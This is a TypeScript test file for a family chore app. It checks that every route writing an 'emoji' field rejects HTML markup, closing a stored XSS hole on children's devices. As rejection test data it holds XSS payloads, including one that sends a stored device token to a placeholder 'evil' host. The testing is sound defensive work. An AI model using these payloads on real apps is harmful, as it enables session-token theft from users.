// The `emoji` field was a way to put markup on another child's tablet: the kid app drew
// it into HTML unescaped while the title beside it went through esc(), and the server
// accepted any string of any length. The views are fixed where they belong; these hold
// the second line, the one that means a view which forgets is not a second exploit.
//
// The validator has to be generous about what an emoji IS — a flag is two codepoints, a
// family with skin tones is seven joined by ZWJ — and strict about exactly one thing.

import { test, expect, beforeEach } from "bun:test";
import { Hono } from "hono";
import { initTestDb } from "./db";
import * as repo from "./repo";
import { hashPin } from "./auth";
import { isValidEmoji, readEmoji } from "./emoji-field";
import { chores } from "./routes/chores";
import { children } from "./routes/children";
import { routinesRoutes } from "./routes/routines";
import { practicesRoutes } from "./routes/practices";

// ---- the rule itself ----

test("real emoji pass, including the multi-codepoint ones people actually use", () => {
  for (const ok of ["🧽", "⭐", "🇺🇸", "#️⃣", "1️⃣", "👨‍👩‍👧‍👦", "👩🏽‍🚀", "🏳️‍🌈", "🐣🦄"]) {
    expect(isValidEmoji(ok)).toBe(true);
  }
});

test("anything that could end an HTML text node or attribute is refused", () => {
  const payloads = [
    '<img src=x onerror="fetch(`https://evil/`+localStorage[`kid.deviceToken`])">',
    "<svg onload=eval(name)>",
    "a&b", '"', "'", "`", "\\", "\u0000", "\u001B[31m",
  ];
  for (const bad of payloads) expect(isValidEmoji(bad)).toBe(false);
});

test("length is bounded in graphemes and in raw characters", () => {
  expect(isValidEmoji("🐣🦄🐸")).toBe(false);      // three clusters is a sentence, not an icon
  expect(isValidEmoji("x".repeat(65))).toBe(false); // and nothing is 65 characters of emoji
  expect(isValidEmoji("")).toBe(false);
});

test("readEmoji falls back for absent or blank, and refuses rather than substituting", () => {
  expect(readEmoji(undefined, "🦖")).toBe("🦖");
  expect(readEmoji("", "🦖")).toBe("🦖");
  expect(readEmoji("   ", "🦖")).toBe("🦖");
  expect(readEmoji(" 🧽 ", "🦖")).toBe("🧽");
  // Not the fallback: a route turns this into a 400. Silently substituting would hide
  // a client bug and, worse, hide an attempt.
  expect(readEmoji("<img src=x>", "🦖")).toBeNull();
});

// ---- every route that writes one ----

const app = new Hono()
  .route("/api", chores).route("/api", children)
  .route("/api", routinesRoutes).route("/api", practicesRoutes);

const post = (p: string, body: Record<string, unknown>) =>
  app.request(p, { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } });
const patchReq = (p: string, body: Record<string, unknown>) =>
  app.request(p, { method: "PATCH", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } });
const put = (p: string, body: Record<string, unknown>) =>
  app.request(p, { method: "PUT", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } });

let fam: repo.Family;
let kid: repo.Child;

beforeEach(async () => {
  initTestDb();
  const f = repo.createFamily("Dad", "NQ00");
  repo.updateFamilySettings(f.id, { mode: "family" });
  repo.setFamilyPin(f.id, await hashPin("1234"));
  fam = repo.getFamily(f.id)!;
  kid = repo.createChild(fam.id, "Kid 1", "🦖");
});

const XSS = '<img src=x onerror="window.stolen=localStorage[\'kid.deviceToken\']">';

test("a chore cannot carry markup in its emoji, and a real one still can", async () => {
  const bad = await post("/api/chores", { childId: kid.id, title: "Tidy up", rewardUsd: 1, emoji: XSS });
  expect(bad.status).toBe(400);
  expect(await bad.json()).toEqual({ error: "invalid_emoji" });

  const good = await post("/api/chores", { childId: kid.id, title: "Tidy up", rewardUsd: 1, emoji: "👨‍👩‍👧‍👦" });
  expect(good.status).toBe(201);
  expect((await good.json()).chore.emoji).toBe("👨‍👩‍👧‍👦");
});

test("a child's avatar emoji is validated the same way", async () => {
  expect((await post("/api/children", { label: "Sib", emoji: XSS })).status).toBe(400);
  const ok = await post("/api/children", { label: "Sib", emoji: "🦊" });
  expect(ok.status).toBe(201);
  expect((await ok.json()).child.emoji).toBe("🦊");
});

test("routines, their tasks, and both edit paths refuse markup too", async () => {
  expect((await post("/api/routines", { childId: kid.id, title: "Morning", slot: "morning", emoji: XSS, pin: "1234" })).status).toBe(400);

  const made = await post("/api/routines", { childId: kid.id, title: "Morning", slot: "morning", pin: "1234" });
  expect(made.status).toBe(201);
  const routineId = (await made.json()).routine.id;

  expect((await patchReq(`/api/routines/${routineId}`, { emoji: XSS, pin: "1234" })).status).toBe(400);
  expect((await post(`/api/routines/${routineId}/tasks`, { title: "Brush", durationS: 60, emoji: XSS, pin: "1234" })).status).toBe(400);

  const task = await post(`/api/routines/${routineId}/tasks`, { title: "Brush", durationS: 60, pin: "1234" });
  expect(task.status).toBe(201);
  const taskId = (await task.json()).task.id;
  expect((await patchReq(`/api/routines/${routineId}/tasks/${taskId}`, { emoji: XSS, pin: "1234" })).status).toBe(400);
  // and the stored value never changed
  expect((await patchReq(`/api/routines/${routineId}/tasks/${taskId}`, { emoji: "🪥", pin: "1234" })).status).toBe(200);
});

test("practices refuse markup on create and on edit", async () => {
  expect((await post("/api/practices", { childId: kid.id, title: "Piano", targetPerWeek: 3, emoji: XSS, pin: "1234" })).status).toBe(400);

  const made = await post("/api/practices", { childId: kid.id, title: "Piano", targetPerWeek: 3, emoji: "🎹", pin: "1234" });
  expect(made.status).toBe(201);
  const id = (await made.json()).practice.id;
  expect((await put(`/api/practices/${id}`, { emoji: XSS, pin: "1234" })).status).toBe(400);
  expect((await put(`/api/practices/${id}`, { emoji: "🎻", pin: "1234" })).status).toBe(200);
});
